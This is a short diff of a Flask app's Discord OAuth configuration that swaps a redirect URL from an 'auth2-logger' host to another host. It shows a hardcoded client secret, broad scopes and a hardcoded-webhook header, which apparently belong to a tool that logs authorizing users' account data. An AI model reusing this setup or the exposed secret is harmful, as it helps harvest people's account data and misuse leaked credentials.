@@ -11,7 +11,7 @@ app.secret_key = os.urandom(32)
 # ===== CONFIG =====
 CLIENT_ID = "1541786357028884534"
 CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
-REDIRECT_URI = "https://auth2-logger.vercel.app/callback"
+REDIRECT_URI = "https://nova-mo.vercel.app/callback"
 OAUTH_SCOPE = "identify connections guilds.members.read email gdm.join"
 
 # ===== WEBHOOK (HARDCODED) =====
